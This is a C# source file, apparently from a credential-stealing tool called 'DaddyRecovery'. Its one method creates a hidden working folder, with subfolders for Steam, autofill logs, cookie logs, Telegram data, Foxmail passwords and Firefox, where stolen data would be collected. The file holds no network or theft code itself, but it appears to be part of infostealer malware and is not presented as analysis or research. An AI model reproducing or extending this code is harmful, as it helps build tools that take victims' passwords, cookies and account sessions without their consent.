namespace DaddyRecovery.Helpers
{
    using System;
    using System.Collections.Generic;
    using System.IO;

    public static class HomeDirectory
    {
        public static void Inizialize()
        {
            string[] Directories = new string[]
            {
                GlobalPath.Steam_Dir,
                GlobalPath.Logs,
                GlobalPath.AutoFillLogs,
                GlobalPath.CookiesLogs,
                GlobalPath.TelegaHome,
                GlobalPath.FoxMailPass,
                GlobalPath.Firefox
            };
            if (!CombineEx.ExistsDir(GlobalPath.HomePath))
            {
                CombineEx.CreateOrDeleteDirectoryEx(true, GlobalPath.HomePath, FileAttributes.Hidden);
                foreach (var dir in Directories)
                {
                    CombineEx.CreateOrDeleteDirectoryEx(true, dir, FileAttributes.Normal);
                }
            }
        }
    }
}